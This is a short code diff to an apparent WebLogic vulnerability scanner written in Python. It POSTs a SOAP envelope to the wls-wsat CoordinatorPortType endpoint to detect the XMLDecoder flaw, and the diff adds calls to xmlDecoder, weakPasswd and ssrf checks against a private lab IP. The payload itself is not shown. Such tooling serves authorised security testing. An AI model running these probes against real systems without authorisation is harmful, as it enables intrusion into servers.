@@ -47,7 +47,6 @@ class WebLogic:
             </soapenv:Header>
         <soapenv:Body/>
         </soapenv:Envelope>"""
-
         req = requests.post(self.url+":7001/wls-wsat/CoordinatorPortType", headers=headers, data=xml)
         if req.status_code == 500 :
             print('[+] WebLogic xml decoder ')
@@ -84,6 +83,9 @@ class WebLogic:
 
 
 if __name__ == '__main__':
-    url = '192.168.1.129'
+    url = '192.168.136.130'
     wls = WebLogic(url)
+
+    wls.xmlDecoder()
+    wls.weakPasswd()
     wls.ssrf()
